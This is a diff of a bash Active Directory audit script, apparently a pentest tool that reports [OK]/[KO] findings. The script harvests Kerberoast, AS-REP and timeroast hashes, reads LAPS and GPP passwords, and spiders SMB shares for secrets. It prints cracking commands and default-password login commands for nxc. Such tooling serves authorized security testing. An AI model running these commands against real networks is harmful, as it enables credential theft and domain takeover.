+  ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(objectClass=msDS-DelegatedManagedServiceAccount)" sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}' | while read -r account; do
+    echo -e "${RED}       └─ $account${NC}"
+  done
+elif [ "$DMSA_COUNT" -gt 0 ]; then
+  echo -e "${GREY}[--] $DMSA_COUNT dMSA object(s) found but DFL $DFL < 10 (BadSuccessor not applicable)${NC}"
+else
+  echo -e "${GREEN}[OK] No dMSA objects found (DFL: $DFL)${NC}"
+fi
+
 echo ""
+
+# Pre-created Computer Accounts Check
+PRECREATED_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=2048))" sAMAccountName dNSHostName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
+PRECREATED_COUNT=$(echo "$PRECREATED_OUTPUT" | grep -v "^$" | wc -l)
+if [ "$PRECREATED_COUNT" -gt 0 ]; then
+  echo -e "${RED}[KO] $PRECREATED_COUNT pre-created computer account(s) found${NC}"
+  echo "$PRECREATED_OUTPUT" | while read -r computer; do
+    [ -z "$computer" ] && continue
+    SHORTNAME=$(echo "${computer%\$}" | tr '[:upper:]' '[:lower:]')
+    echo -e "${RED}       └─ $computer${NC}"
+    echo -e "${GREY}          └─ Default password: $SHORTNAME${NC}"
+    echo -e "${GREY}             nxc smb $DC_IP -u '$computer' -p '$SHORTNAME' -d '$DOMAIN'${NC}"
+  done
+else
+  echo -e "${GREEN}[OK] No pre-created computer accounts found${NC}"
+fi
 
 # MachineAccountQuota Check
 MAQ=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
@@ -725,9 +782,9 @@ else
   fi
   if [ ! -z "$DACLEDIT_CMD" ]; then
     DCSHADOW_ACE=$($DACLEDIT_CMD -action read -target-dn "$DOMAIN_DN" \
-      -dc-ip $DC_IP "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null | \
+      -dc-ip $DC_IP "$DOMAIN/$AD_USER:$PASSWORD" 2>/dev/null | \
       grep -iE "GenericAll|WriteDacl|DS-Install-Replica|Manage-Topology" | \
-      grep -i "$USERNAME")
+      grep -i "$AD_USER")
     if [ ! -z "$DCSHADOW_ACE" ]; then
       echo -e "${RED}       └─ DCShadow preconditions may be met (ACL on domain NC): https://github.com/ShutdownRepo/dcshadow${NC}"
     else
@@ -739,38 +796,48 @@ else
 fi
 
 # Pre-Windows 2000 Computer Accounts
-PRE2K_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -M pre2k 2>/dev/null)
-if echo "$PRE2K_OUTPUT" | grep -qi "vulnerable\|\[+\]"; then
+PRE2K_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -M pre2k 2>/dev/null)
+if echo "$PRE2K_OUTPUT" | grep -q "Found.*pre-created computer accounts"; then
   echo -e "${RED}[KO] Pre-Windows 2000 computer accounts found → pre2k.txt${NC}"
-  echo "$PRE2K_OUTPUT" > "$OUTPUT_DIR/pre2k.txt"
+  echo "$PRE2K_OUTPUT" | grep "Pre-created computer account\|Found.*pre-created" > "$OUTPUT_DIR/pre2k.txt"
 else
   echo -e "${GREEN}[OK] No Pre-Windows 2000 computer accounts found${NC}"
 fi
 
 # LAPS Check
-LAPS_SCHEMA=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
+LAPS_V1=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
   -b "CN=Schema,CN=Configuration,$DOMAIN_DN" \
   "(name=ms-Mcs-AdmPwd)" name 2>/dev/null | grep -c "name: ms-Mcs-AdmPwd")
 
-LAPS_NEW_SCHEMA=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
+LAPS_V2=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
   -b "CN=Schema,CN=Configuration,$DOMAIN_DN" \
   "(name=msLAPS-Password)" name 2>/dev/null | grep -c "name: msLAPS-Password")
 
-if [ "$LAPS_SCHEMA" -gt 0 ] || [ "$LAPS_NEW_SCHEMA" -gt 0 ]; then
-  # Check if we can read any LAPS passwords
-  LAPS_READABLE=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M laps 2>/dev/null | grep -v "No result found" | grep -c "Password:")
-  
+if [ "$LAPS_V1" -gt 0 ]; then
+  LAPS_READABLE=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" -M laps 2>/dev/null | grep -v "No result found" | grep -c "Password:")
   if [ "$LAPS_READABLE" -gt 0 ]; then
-    echo -e "${RED}[KO] LAPS deployed - passwords readable by current user${NC}"
+    echo -e "${RED}[KO] LAPSv1 deployed - passwords readable by current user${NC}"
   else
-    echo -e "${GREEN}[OK] LAPS deployed - passwords not readable by current user${NC}"
+    echo -e "${GREEN}[OK] LAPSv1 deployed - passwords not readable${NC}"
+    echo -e "${GREY}       └─ LAPSv1 stores passwords in cleartext attribute${NC}"
   fi
 else
-  echo -e "${RED}[KO] LAPS not deployed${NC}"
+  echo -e "${RED}[KO] LAPSv1 not deployed${NC}"
+fi
+
+if [ "$LAPS_V2" -gt 0 ]; then
+  LAPS_V2_READABLE=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" -M laps --laps-v2 2>/dev/null | grep -v "No result found" | grep -c "Password:")
+  if [ "$LAPS_V2_READABLE" -gt 0 ]; then
+    echo -e "${RED}[KO] LAPSv2 deployed - passwords readable by current user${NC}"
+  else
+    echo -e "${GREEN}[OK] LAPSv2 deployed - passwords not readable by current user${NC}"
+  fi
+else
+  echo -e "${RED}[KO] LAPSv2 not deployed${NC}"
 fi
 
 # Password policy
-POL_OUT=$(nxc smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD" --pass-pol 2>/dev/null)
+POL_OUT=$(nxc smb "$DC_IP" -u "$AD_USER" -p "$PASSWORD" --pass-pol 2>/dev/null)
 MIN_PW_LENGTH=$(echo "$POL_OUT" | grep -i 'Minimum password length' | awk -F: '{print $2}' | tr -d ' ')
 LOCKOUT_THRESHOLD=$(echo "$POL_OUT" | grep -i 'Account Lockout Threshold' | awk -F: '{print $2}' | tr -d ' ')
 LOCKOUT_WINDOW=$(echo "$POL_OUT" | grep -i 'Reset Account Lockout Counter' | awk -F: '{print $2}' | tr -d ' ')
@@ -876,8 +943,8 @@ if [ "$GHOST_COUNT" -gt 0 ]; then
     FIRST_GHOST=$(echo -e "$GHOST_LIST" | head -1 | grep -oP '(?<=TERMSRV/|HOST/|RestrictedKrbHost/|HTTP/)[^$]+' | head -1)
     if [ ! -z "$FIRST_GHOST" ]; then
       GHOST_HOSTNAME=$(echo "$FIRST_GHOST" | cut -d'.' -f1)
-      echo -e "${GREY}       └─ addcomputer.py -computer-name '${GHOST_HOSTNAME}\$' -computer-pass 'ComplexPass123!' '$DOMAIN'/'$USERNAME':'$PASSWORD'${NC}"
-      echo -e "${GREY}       └─ GetUserSPNs.py '$DOMAIN'/'$USERNAME':'$PASSWORD' -request -dc-ip $DC_IP${NC}"
+      echo -e "${GREY}       └─ addcomputer.py -computer-name '${GHOST_HOSTNAME}\$' -computer-pass 'ComplexPass123!' '$DOMAIN'/'$AD_USER':'$PASSWORD'${NC}"
+      echo -e "${GREY}       └─ GetUserSPNs.py '$DOMAIN'/'$AD_USER':'$PASSWORD' -request -dc-ip $DC_IP${NC}"
     fi
   else
     echo -e "${GREY}       └─ Not exploitable: MachineAccountQuota = 0${NC}"
@@ -890,7 +957,7 @@ else
 fi
 
 # Kerberoasting Check
-KERBEROAST_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --kerberoasting "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null)
+KERBEROAST_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" --kerberoasting "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null)
 KERBEROAST_COUNT=$(grep -c '\$krb5tgs\$' "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null)
 KERBEROAST_COUNT=${KERBEROAST_COUNT:-0}
 
@@ -907,7 +974,7 @@ else
 fi
 
 # AS-REP Roasting Check
-ASREP_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --asreproast "$OUTPUT_DIR/asrep.txt" 2>/dev/null)
+ASREP_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" --asreproast "$OUTPUT_DIR/asrep.txt" 2>/dev/null)
 ASREP_COUNT=$(grep -c '$krb5asrep$' "$OUTPUT_DIR/asrep.txt" 2>/dev/null || echo 0)
 
 if [ "$ASREP_COUNT" -gt 0 ]; then
@@ -922,7 +989,7 @@ else
 fi
 
 # Timeroasting Check
-TIMEROAST_OUTPUT=$(timeout 60 nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -M timeroast -o RIDS=500-5000 2>/dev/null)
+TIMEROAST_OUTPUT=$(timeout 60 nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -M timeroast -o RIDS=500-5000 2>/dev/null)
 TIMEROAST_HASHES=$(echo "$TIMEROAST_OUTPUT" | grep -c '\$sntp-ms\$')
 
 if [ "$TIMEROAST_HASHES" -gt 0 ]; then
@@ -931,7 +998,7 @@ if [ "$TIMEROAST_HASHES" -gt 0 ]; then
   echo -e "${GREY}       └─ hashcat -m 31300 '$OUTPUT_DIR/timeroast.txt' /usr/share/wordlists/rockyou.txt${NC}"
 elif echo "$TIMEROAST_OUTPUT" | grep -qE "STATUS_NOT_SUPPORTED|NTLM.*disabled|Kerberos"; then
   echo -e "${GREY}[--] Timeroasting skipped: NTLM disabled${NC}"
-  echo -e "${GREY}       └─ Use Kerberos auth: nxc smb $DC_FQDN -u '$USERNAME' -p '$PASSWORD' -k -M timeroast${NC}"
+  echo -e "${GREY}       └─ Use Kerberos auth: nxc smb $DC_FQDN -u '$AD_USER' -p '$PASSWORD' -k -M timeroast${NC}"
 else
   echo -e "${GREEN}[OK] No Timeroastable accounts found${NC}"
 fi
@@ -954,10 +1021,10 @@ else
 fi
 
 # GPP Passwords (SYSVOL)
-GPP_OUTPUT=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" --share=SYSVOL -M gpp_password 2>/dev/null)
-if echo "$GPP_OUTPUT" | grep -qi "password\|\[+\]"; then
+GPP_OUTPUT=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" --share=SYSVOL -M gpp_password 2>/dev/null)
+if echo "$GPP_OUTPUT" | grep -q "Found credentials in"; then
   echo -e "${RED}[KO] GPP credentials found → gpp_passwords.txt${NC}"
-  echo "$GPP_OUTPUT" | grep -i "password\|\[+\]" > "$OUTPUT_DIR/gpp_passwords.txt"
+  echo "$GPP_OUTPUT" | grep "Found credentials in" > "$OUTPUT_DIR/gpp_passwords.txt"
 else
   echo -e "${GREEN}[OK] No GPP passwords found${NC}"
 fi
@@ -1032,11 +1099,11 @@ fi
 echo ""
 echo -e "${GREY}[*] Running GoWitness...${NC}"
 mkdir -p "$OUTPUT_DIR/screenshots"
-nmap -p80,443,8080,8443 ${SUBNET}.0/24 --open -oG - 2>/dev/null | awk '/open/{print $2}' > "$OUTPUT_DIR/http_targets.txt"
-HTTP_COUNT=$(wc -l < "$OUTPUT_DIR/http_targets.txt" 2>/dev/null || echo 0)
+nmap -p80,443,8080,8443 ${SUBNET}.0/24 --open -oG - 2>/dev/null | awk '/open/{print $2}' | grep -E '^[0-9]' | while read -r ip; do echo "http://$ip"; echo "https://$ip"; done > "$OUTPUT_DIR/http_targets.txt"
+HTTP_COUNT=$([ -f "$OUTPUT_DIR/http_targets.txt" ] && wc -l < "$OUTPUT_DIR/http_targets.txt" || echo 0)
 if [ "$HTTP_COUNT" -gt 0 ] && command -v gowitness &>/dev/null; then
-  gowitness scan file -f "$OUTPUT_DIR/http_targets.txt" --screenshot-path "$OUTPUT_DIR/screenshots/" &>/dev/null
-  SHOT_COUNT=$(ls "$OUTPUT_DIR/screenshots/"*.png 2>/dev/null | wc -l)
+  gowitness scan file -f "$OUTPUT_DIR/http_targets.txt" --screenshot-path "$OUTPUT_DIR/screenshots/" --timeout 10 --threads 10 --write-none 2>/dev/null
+  SHOT_COUNT=$(ls "$OUTPUT_DIR/screenshots/"*.jpeg 2>/dev/null | wc -l)
   echo -e "${GREEN}[OK] GoWitness captured $SHOT_COUNT screenshot(s) → screenshots/${NC}"
 elif ! command -v gowitness &>/dev/null; then
   echo -e "${GREY}[--] GoWitness not found, skipping screenshots${NC}"
@@ -1074,16 +1141,16 @@ else
 fi
 
 # SMB Share Enumeration
-nxc smb ${SUBNET}.0/24 -u "$USERNAME" -p "$PASSWORD" --shares 2>/dev/null \
+nxc smb ${SUBNET}.0/24 -u "$AD_USER" -p "$PASSWORD" --shares 2>/dev/null \
   | grep -E "READ|WRITE" > "$OUTPUT_DIR/smb_shares.txt"
 
 READABLE=$(wc -l < "$OUTPUT_DIR/smb_shares.txt" 2>/dev/null || echo 0)
 if [ "$READABLE" -gt 0 ]; then
   echo -e "${RED}[KO] $READABLE readable/writable share(s) found → smb_shares.txt${NC}"
-  echo -e "${GREY}       └─ Scan more: nxc smb <SUBNET>/24 -u '$USERNAME' -p '$PASSWORD' --shares'${NC}"
+  echo -e "${GREY}       └─ Scan more: nxc smb <SUBNET>/24 -u '$AD_USER' -p '$PASSWORD' --shares'${NC}"
 else
   echo -e "${GREEN}[OK] No readable/writable shares found on ${SUBNET}.0/24${NC}"
-  echo -e "${GREY}       └─ Scan more: nxc smb <SUBNET>/24 -u '$USERNAME' -p '$PASSWORD' --shares'${NC}"
+  echo -e "${GREY}       └─ Scan more: nxc smb <SUBNET>/24 -u '$AD_USER' -p '$PASSWORD' --shares'${NC}"
 fi
 
 # Manspider against readable SMB Shares
@@ -1096,24 +1163,26 @@ if [ "$BH_MODE" != "DCOnly" ]; then
     else
       MANSPIDER_CMD=""
     fi
-
     if [ ! -z "$MANSPIDER_CMD" ]; then
-      SHARE_HOSTS=$(grep -oE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$OUTPUT_DIR/smb_shares.txt" | sort -u | head -5)
+      SHARE_HOSTS=$(grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$OUTPUT_DIR/smb_shares.txt" | sort -u | head -5)
       mkdir -p "$OUTPUT_DIR/manspider"
+      > "$OUTPUT_DIR/manspider/results.txt"
       echo "$SHARE_HOSTS" | while read -r share_host; do
-        timeout 120 $MANSPIDER_CMD "$share_host" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" \
-          -c password passwd secret credential token apikey \
-          -e txt xml ini config conf csv bat ps1 \
-          --output-dir "$OUTPUT_DIR/manspider" &>/dev/null
+        timeout 120 $MANSPIDER_CMD "$share_host" -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -c password passwd secret credential token apikey username connectionstring pwd -e txt xml ini config conf csv bat ps1 2>&1 | grep "matched" >> "$OUTPUT_DIR/manspider/results.txt"
       done
-      SPIDER_COUNT=$(find "$OUTPUT_DIR/manspider" -type f 2>/dev/null | wc -l)
+      SPIDER_COUNT=$(grep -c "matched" "$OUTPUT_DIR/manspider/results.txt" 2>/dev/null || echo 0)
       if [ "$SPIDER_COUNT" -gt 0 ]; then
-        echo -e "${RED}[KO] Manspider found $SPIDER_COUNT file(s) with sensitive content → manspider/${NC}"
+        echo -e "${RED}[KO] Manspider found $SPIDER_COUNT file(s) with sensitive content → manspider/results.txt${NC}"
+        while IFS= read -r line; do
+          echo -e "${RED}       └─ $line${NC}"
+        done < "$OUTPUT_DIR/manspider/results.txt"
       else
         echo -e "${GREEN}[OK] Manspider found no sensitive content on readable shares${NC}"
+        rm -rf "$OUTPUT_DIR/manspider"
       fi
     else
       echo -e "${GREY}[--] Manspider not found, skipping secret scan${NC}"
+      rm -rf "$OUTPUT_DIR/manspider"
     fi
   fi
 fi
